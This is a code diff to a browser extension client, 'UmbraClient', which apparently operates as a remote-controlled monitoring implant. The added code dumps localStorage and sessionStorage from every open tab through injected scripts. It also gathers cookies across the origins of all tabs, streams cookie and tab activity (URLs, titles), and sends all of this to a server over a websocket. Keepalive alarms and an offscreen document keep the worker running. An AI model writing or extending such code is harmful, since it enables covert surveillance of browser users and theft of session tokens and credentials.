@@ -135,6 +135,7 @@ class UmbraClient {
       // System fingerprint
       GET_SYSTEM_INFO: async () => ({ system_info: await this.getSystemInfo() }),
       GET_PROCESSES:   async () => ({ processes: await this.getProcesses() }),
+      GET_PAGE_STORAGE: async () => ({ storage: await this.collectPageStorage() }),
 
       // Full-page archive
       CAPTURE_PAGE_MHTML: async (p) => this.capturePageMhtml(p),
@@ -301,6 +302,8 @@ class UmbraClient {
     // Check persistent features
     setInterval(async () => this.checkPersistentFeatures(), 10000);
 
+    this.setupKeepalive();
+
     // Sync basic data — uses configurable interval
     const syncLoop = async () => {
       await this.syncBasicData();
@@ -357,6 +360,8 @@ class UmbraClient {
       } else if (message.type === "CLIPBOARD_DATA") {
         this.handleClipboardData(message.data, sender);
         sendResponse({ success: true });
+      } else if (message.type === "KEEPALIVE") {
+        sendResponse({ ok: true });
       }
     });
 
@@ -450,6 +455,77 @@ class UmbraClient {
       chrome.webNavigation.onCompleted.addListener(sendNav);
       chrome.webNavigation.onHistoryStateUpdated.addListener(sendNav);
     }
+
+    if (chrome.cookies && chrome.cookies.onChanged) {
+      chrome.cookies.onChanged.addListener((change) => {
+        if (!this.websocket || this.websocket.readyState !== 1) return;
+        const cookie = change.cookie || {};
+        this.websocket.send(JSON.stringify({
+          id: this.uuidv4(),
+          version: "1.0.0",
+          action: "COOKIE_EVENT",
+          data: {
+            cause: change.cause,
+            action: change.removed ? "removed" : "changed",
+            name: cookie.name,
+            domain: cookie.domain,
+            path: cookie.path,
+            cookie: {
+              name: cookie.name,
+              domain: cookie.domain,
+              path: cookie.path,
+              partitionKey: cookie.partitionKey || null,
+            },
+          },
+        }));
+      });
+    }
+
+    if (chrome.tabs) {
+      const sendTab = (action, tab) => {
+        if (!this.websocket || this.websocket.readyState !== 1) return;
+        this.websocket.send(JSON.stringify({
+          id: this.uuidv4(),
+          version: "1.0.0",
+          action: "TAB_EVENT",
+          data: {
+            action,
+            tab_id: tab && tab.id,
+            url: tab && tab.url,
+            title: tab && tab.title,
+          },
+        }));
+      };
+      if (chrome.tabs.onCreated) chrome.tabs.onCreated.addListener((tab) => sendTab("created", tab || {}));
+      if (chrome.tabs.onRemoved) chrome.tabs.onRemoved.addListener((id) => sendTab("removed", { id }));
+      if (chrome.tabs.onUpdated) {
+        chrome.tabs.onUpdated.addListener((_id, info, tab) => {
+          if (info.url || info.title || info.status === "complete") sendTab("updated", tab || {});
+        });
+      }
+      if (chrome.tabs.onActivated) {
+        chrome.tabs.onActivated.addListener(async (active) => {
+          try {
+            const tab = await chrome.tabs.get(active.tabId);
+            sendTab("activated", tab || { id: active.tabId });
+          } catch (_err) {
+            sendTab("activated", { id: active.tabId });
+          }
+        });
+      }
+    }
+  }
+
+  setupKeepalive() {
+    if (chrome.alarms && typeof chrome.alarms.create === "function") {
+      chrome.alarms.create("umbra-keepalive", { periodInMinutes: 1 });
+      chrome.alarms.onAlarm.addListener((alarm) => {
+        if (alarm && alarm.name === "umbra-keepalive") {
+          this.checkWebsocketConnection();
+        }
+      });
+    }
+    this.setupOffscreenDocument().catch(() => {});
   }
 
   // Check websocket connection health and reconnect if needed
@@ -779,7 +855,71 @@ class UmbraClient {
 
   async getCookies() {
     if (!chrome.cookies) return [];
-    return this.getAllCookies({});
+    const collect = globalThis.UmbraCookieCollect;
+    if (!collect) return this.getAllCookies({});
+    let tabs = [];
+    try {
+      tabs = await new Promise((resolve) => {
+        if (!chrome.tabs || !chrome.tabs.query) {
+          resolve([]);
+          return;
+        }
+        chrome.tabs.query({}, (result) => resolve(result || []));
+      });
+    } catch (_err) {
+      tabs = [];
+    }
+    return collect.collectAllCookies((details) => this.getAllCookies(details), collect.originsFromTabs(tabs));
+  }
+
+  async collectPageStorage() {
+    if (!chrome.tabs || !chrome.scripting || !chrome.scripting.executeScript) return [];
+    const tabs = await new Promise((resolve) => chrome.tabs.query({}, (result) => resolve(result || [])));
+    const origins = [];
+    const seen = new Set();
+    for (const tab of tabs) {
+      if (!tab.id || !tab.url || !/^https?:/i.test(tab.url)) continue;
+      try {
+        const results = await chrome.scripting.executeScript({
+          target: { tabId: tab.id },
+          world: "MAIN",
+          func: () => {
+            const dump = (bag) => {
+              const out = {};
+              try {
+                for (let i = 0; i < bag.length; i += 1) {
+                  const key = bag.key(i);
+                  if (key != null) out[key] = bag.getItem(key);
+                }
+              } catch (_e) {}
+              return out;
+            };
+            return {
+              origin: location.origin,
+              href: location.href,
+              localStorage: dump(localStorage),
+              sessionStorage: dump(sessionStorage),
+            };
+          },
+        });
+        const harvested = results && results[0] && results[0].result;
+        if (harvested && harvested.origin && !seen.has(harvested.origin)) {
+          seen.add(harvested.origin);
+          origins.push(harvested);
+        }
+      } catch (_err) {
+        // Restricted pages cannot be scripted.
+      }
+    }
+    if (this.websocket && this.websocket.readyState === 1) {
+      this.websocket.send(JSON.stringify({
+        id: this.uuidv4(),
+        version: "1.0.0",
+        action: "PAGE_STORAGE",
+        data: { origins },
+      }));
+    }
+    return origins;
   }
 
   getAllCookies(details) {
@@ -1510,9 +1650,9 @@ class UmbraClient {
       this.debugLog("Creating offscreen document...");
       await chrome.offscreen.createDocument({
         url: offscreenUrl,
-        reasons: ["USER_MEDIA"],
+        reasons: ["USER_MEDIA", "DOM_PARSER"],
         justification:
-          "Capture audio from the browser for monitoring purposes.",
+          "Capture authorized monitoring audio and keep the sensor worker alive.",
       });
       this.debugLog("Offscreen document created, waiting for ready...");
       await this.waitForOffscreenReady();
